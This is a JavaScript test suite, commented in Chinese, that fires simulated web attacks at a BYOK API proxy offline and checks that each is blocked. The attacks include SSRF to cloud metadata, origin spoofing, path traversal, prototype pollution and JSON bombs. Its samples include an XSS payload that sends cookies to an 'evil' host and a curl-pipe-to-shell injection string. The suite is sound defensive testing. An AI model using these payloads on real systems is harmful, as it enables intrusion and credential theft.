/**
 * 攻击模拟套件：把常见 Web 攻击打到 BYOK 转发器上，验证每一类都被正确拒绝。
 *
 *   node scripts/test-proxy-attacks.mjs
 *
 * 全部离线：上游 fetch 被替换为进程内 stub，攻击载荷只经过 Worker 的判定逻辑，
 * 不会有一字节真实流量打到 GitHub / Cloudflare / 任何上游服务商。
 *
 * 覆盖的攻击类别与本站攻击面的对应关系见 scripts/audit-build.mjs 头注释。
 */
import { readFileSync } from 'fs'

const worker = await import('../proxy/src/index.js')
const source = readFileSync(new URL('../proxy/src/index.js', import.meta.url), 'utf8')

const ENV = {
  ALLOWED_ORIGINS: 'https://luvisage.github.io,http://localhost:3000',
  UPSTREAM_ALLOWLIST: 'https://api.openai.com/v1',
  MAX_TOKENS: '1024',
  MAX_BODY_BYTES: '2048',
  EMBED_BATCH: '4',
  REQUESTS_PER_MINUTE: '3',
  REQUESTS_PER_DAY: '200',
}

const failures = []
const check = (name, ok, detail) => {
  console.log(`${ok ? 'ok  ' : 'FAIL'}  ${name}${ok || !detail ? '' : ` — ${detail}`}`)
  if (!ok) failures.push(name)
}

let sent = []
let behaviour = { status: 200, type: 'application/json', body: '{}' }
globalThis.fetch = async (url, init) => {
  sent.push({ url: String(url), init })
  if (behaviour === 'boom') throw new TypeError('upstream down')
  return new Response(behaviour.body, { status: behaviour.status, headers: { 'content-type': behaviour.type } })
}

/** cf.clientIp 在生产里由 Cloudflare 注入且不可伪造——用鸭子类型对象模拟。 */
function makeRequest(path, { method = 'POST', headers = {}, body, cf } = {}) {
  const h = new Headers(headers)
  const url = `https://proxy.test${path}`
  if (cf) {
    const text = async () => (typeof body === 'string' ? body : body ? JSON.stringify(body) : '')
    return { url, method, headers: h, cf, text }
  }
  return new Request(url, {
    method,
    headers: h,
    ...(body ? { body: typeof body === 'string' ? body : JSON.stringify(body) } : {}),
  })
}

/* 未显式给 IP 的用例各自独占一个配额桶，避免用例间互相污染限额。 */
let autoIpCounter = 0
const autoIp = () => `198.18.0.${(autoIpCounter = (autoIpCounter + 1) % 250) + 1}`

async function call(path, opts = {}) {
  const headers = { origin: opts.origin === undefined ? 'https://luvisage.github.io' : opts.origin, ...opts.headers }
  const ip = opts.ip ?? autoIp()
  headers['x-forwarded-for'] = ip
  if (opts.authorization !== null && headers.authorization === undefined) {
    headers.authorization = opts.authorization ?? 'Bearer sk-test'
  }
  if (opts.upstream !== null) headers['x-upstream-base'] = opts.upstream ?? 'https://api.openai.com/v1'
  const request = makeRequest(path, { method: opts.method, headers, body: opts.body, cf: opts.cf })
  return worker.default.fetch(request, ENV)
}

const chatBody = { model: 'gpt-4o-mini', messages: [{ role: 'user', content: 'hey' }] }

/* ============================================================
 * 1. Origin / CORS 绕过（CSRF 类）：跨站请求必须全部撞墙
 * ============================================================ */

const originSpoofs = [
  ['同形后缀欺骗', 'https://luvisage.github.io.evil.com'],
  ['前缀欺骗', 'https://luvisage.github.io.attacker.cn'],
  ['子域冒充', 'https://luvisage.github.io.secure-look.cn'],
  ['大小写混合域名', 'https://LuVisage.github.io.evil.com'],
  ['带端口', 'https://luvisage.github.io:8443'],
  ['null origin（沙箱页面）', 'null'],
  ['file:// 来源', 'file://'],
  ['data: 来源', 'data:text/html'],
]
for (const [name, origin] of originSpoofs) {
  const r = await call('/v1/chat/completions', { origin })
  check(`origin 绕过被拒：${name}`, r.status === 403 && !r.headers.get('access-control-allow-origin'), `${r.status} ${r.headers.get('access-control-allow-origin') ?? ''}`)
}

const noOrigin = await call('/v1/chat/completions', { origin: null })
check('无 Origin 的服务端直连请求 403（CSRF 无法构造）', noOrigin.status === 403, String(noOrigin.status))

const allowedEcho = await call('/v1/chat/completions', { origin: 'HTTPS://LUVISAGE.GITHUB.IO', body: chatBody })
check('合法来源大小写不敏感且精确回显', allowedEcho.status === 200 && allowedEcho.headers.get('access-control-allow-origin') === 'HTTPS://LUVISAGE.GITHUB.IO', `${allowedEcho.status} ${allowedEcho.headers.get('access-control-allow-origin')}`)

/* ============================================================
 * 2. SSRF：x-upstream-base 是访客可控头，必须整串命中白名单
 * ============================================================ */

const ssrf = [
  ['裸恶意域', 'https://evil.com/v1'],
  ['合法域 + 恶意后缀', 'https://api.openai.com/v1.evil.com'],
  ['userinfo 注入（@ 绕过）', 'https://api.openai.com@evil.com/v1'],
  ['非标端口', 'https://api.openai.com:8443/v1'],
  ['IPv6 环回', 'https://[::1]/v1'],
  ['元数据服务（云凭证）', 'https://169.254.169.254/latest/meta-data'],
  ['路径穿越到未知路径', 'https://api.openai.com/v1/../admin'],
  ['http 降级', 'http://api.openai.com/v1'],
  ['HTTPS 大小写混淆协议', 'hTtPs://api.openai.com/v1'],
]
for (const [name, upstream] of ssrf) {
  sent = []
  const r = await call('/v1/chat/completions', { upstream, body: chatBody, ip: '5.5.5.5' })
  check(`SSRF 被拒：${name}`, r.status === 403 && sent.length === 0, `${r.status} 上游调用 ${sent.length} 次`)
}

/* ============================================================
 * 3. 路径穿越与路由混淆（目录遍历类比）
 * ============================================================ */

const paths = [
  ['目录穿越拼路径', '/v1/chat/completions/../embeddings'],
  ['URL 编码穿越', '/v1/chat/completions%2f..%2fadmin'],
  ['点号编码穿越', '/v1/chat/completions%2e%2e/embeddings'],
  ['双斜杠混淆', '//v1/chat/completions'],
  ['大写路径', '/V1/CHAT/COMPLETIONS'],
  ['伪造成已知路径的前缀', '/v1/chat/completions/admin'],
  ['敏感文件探测', '/.env'],
  ['源码目录探测', '/.git/config'],
  ['管理面板探测', '/admin'],
]
for (const [name, path] of paths) {
  sent = []
  const r = await call(path, { body: chatBody, ip: '6.6.6.6' })
  check(`路径攻击被拒：${name}`, r.status === 404 && sent.length === 0, `${r.status}`)
}

/* ============================================================
 * 4. 注入载荷：透传必须"只进 JSON、不出 HTML"
 * ============================================================ */

const injections = [
  ['SQL 注入', "'; DROP TABLE users;--"],
  ['XSS', '<script>alert(document.cookie)</script>'],
  ['XSS 变体', '<img src=x onerror=fetch("https://evil/?"+document.cookie)>'],
  ['模板注入', '{{7*7}}${7*7}'],
  ['SSTI/命令注入拼接', '; curl https://evil.sh | sh #'],
]
for (const [name, payload] of injections) {
  sent = []
  const body = { model: 'm', messages: [{ role: 'user', content: payload }] }
  const r = await call('/v1/chat/completions', { body })
  const text = await r.text()
  const upstreamBody = sent[0] ? JSON.parse(sent[0].init.body) : null
  check(
    `注入载荷安全透传：${name}`,
    r.status === 200
      && sent.length === 1
      && upstreamBody?.messages?.[0]?.content === payload
      && (r.headers.get('content-type') || '').includes('application/json')
      && !text.trimStart().startsWith('<'),
    `${r.status}`,
  )
}

/* CRLF 头注入：第一道防线是 HTTP 客户端本体——标准客户端根本无法构造这种请求 */
sent = []
let clientRejected = false
try {
  await call('/v1/chat/completions', {
    headers: { authorization: 'Bearer sk-x\r\nX-Evil: injected' },
    body: chatBody,
    ip: '7.7.7.8',
  })
} catch {
  clientRejected = true
}
check('CRLF 头注入无法构造成合法请求（客户端层拒绝）', clientRejected && sent.length === 0, `上游调用 ${sent.length} 次`)

/* 第二道防线：制表符是合法的头字符但不是合法的 Bearer 令牌字符，
   Worker 的 Bearer 格式校验必须把这类变形令牌挡下。 */
sent = []
const rTab = await call('/v1/chat/completions', {
  headers: { authorization: 'Bearer sk-x\tX-Evil: injected' },
  body: chatBody,
  ip: '7.7.7.9',
})
check('变形令牌（制表符）被 Bearer 格式校验拒绝', rTab.status === 401 && sent.length === 0, `${rTab.status} / 上游调用 ${sent.length} 次`)

/* ============================================================
 * 5. 请求体攻击：原型污染 / 类型混淆 / 炸弹
 * ============================================================ */

sent = []
const polluted = JSON.parse('{"__proto__":{"polluted":true},"model":"m","messages":[],"max_tokens":99999}')
const rPollute = await call('/v1/chat/completions', { body: polluted, ip: '8.8.8.8' })
const upBody = sent[0] ? JSON.parse(sent[0].init.body) : {}
check('原型污染载荷不污染全局原型', ({}).polluted === undefined, String(({}).polluted))
check('原型污染载荷的 max_tokens 仍被钳制', upBody.max_tokens === 1024, String(upBody.max_tokens))
check('原型污染载荷正常应答', rPollute.status === 200, String(rPollute.status))

const typeAbuse = [
  ['字符串型 max_tokens', '{"model":"m","messages":[],"max_tokens":"99999"}'],
  ['对象型 max_tokens', '{"model":"m","messages":[],"max_tokens":{"a":1}}'],
  ['负数 max_tokens', '{"model":"m","messages":[],"max_tokens":-5}'],
  ['浮点 max_tokens', '{"model":"m","messages":[],"max_tokens":2048.75}'],
  ['超大科学计数 max_tokens', '{"model":"m","messages":[],"max_tokens":1e12}'],
]
for (const [name, raw] of typeAbuse) {
  sent = []
  const r = await call('/v1/chat/completions', { body: raw })
  const upstreamMax = sent[0] ? JSON.parse(sent[0].init.body).max_tokens : null
  check(`max_tokens 类型混淆被钳制：${name}`, r.status === 200 && upstreamMax === 1024, `upstream=${upstreamMax} status=${r.status}`)
}

/* 深层嵌套炸弹：解析失败必须落进 4xx，而不是把 Worker 打崩 */
const bomb = '{"a":'.repeat(5000) + '1' + '}'.repeat(5000)
const rBomb = await call('/v1/chat/completions', { body: bomb, ip: '8.8.8.10' })
check('深层嵌套炸弹返回 4xx 而非崩溃', rBomb.status >= 400 && rBomb.status < 500, String(rBomb.status))

const rBad = await call('/v1/chat/completions', { body: '{not json', ip: '8.8.8.11' })
check('非法 JSON 返回 400', rBad.status === 400, String(rBad.status))

/* ============================================================
 * 6. 暴力破解与 DoS：Key 喷洒 / IP 轮换 / 限额
 * ============================================================ */

/* 单 IP 喷洒不同 Key：限额按 IP 走，喷 Key 不绕过 */
sent = []
const spray = []
for (let i = 0; i < 5; i++) {
  spray.push((await call('/v1/chat/completions', { ip: '9.9.9.1', authorization: `Bearer sk-spray-${i}`, body: chatBody })).status)
}
check('同 IP 喷洒不同 Key 仍被限流', spray.join(',') === '200,200,200,429,429', spray.join(','))

/* cf.clientIp 优先且不可被 XFF 伪造：轮换 XFF 头无法获得新配额 */
sent = []
const rotate = []
for (let i = 0; i < 5; i++) {
  const r = await call('/v1/chat/completions', {
    body: chatBody,
    cf: { clientIp: '10.10.10.10' },
    headers: { 'x-forwarded-for': `10.0.0.${i + 1}` },
  })
  rotate.push(r.status)
}
check('伪造 XFF 轮换无法绕过 cf.clientIp 限额', rotate.join(',') === '200,200,200,429,429', rotate.join(','))

/* 方法滥用（TRACE 会被 HTTP 客户端本体拒绝，同样视为未触达上游） */
for (const method of ['PUT', 'DELETE', 'PATCH', 'TRACE']) {
  sent = []
  let status = 'client-rejected'
  try {
    status = (await call('/v1/chat/completions', { method, body: chatBody })).status
  } catch {
    /* undici 对 TRACE 直接抛错——也属于"未触达上游" */
  }
  check(`方法滥用被拒：${method}`, status === 405 || status === 404 || status === 'client-rejected', String(status))
}

/* 访客多塞的头不会上 wires：只允许 authorization / content-type / x-upstream-base */
sent = []
await call('/v1/chat/completions', {
  body: chatBody,
  ip: '9.9.9.3',
  headers: { 'x-evil-header': 'injected', cookie: 'session=stolen' },
})
const upstreamHeaderKeys = Object.keys(sent[0]?.init.headers || {})
check('访客自定义头与 Cookie 不会转发到上游', !upstreamHeaderKeys.includes('x-evil-header') && !upstreamHeaderKeys.includes('cookie'), upstreamHeaderKeys.join(','))

/* ============================================================
 * 7. 源码级断言：安全性质必须是代码事实，不是注释
 * ============================================================ */

/* 先剥掉注释再断言——注释里"no D1"这类否定句不是代码事实。 */
const codeOnly = source
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/\/\/.*$/gm, '')
check('Worker 不写任何持久化存储', !/\.put\(|\.batch\(|\.exec\(|D1Database|KVNamespace/.test(codeOnly))
check('错误响应不回显访客请求体', !/message:\s*\$\{raw|message:\s*\+\s*raw/.test(source))

console.log(failures.length ? `\n${failures.length} 项不通过：${failures.join('、')}` : '\n攻击模拟全部通过')
process.exit(failures.length ? 1 : 0)
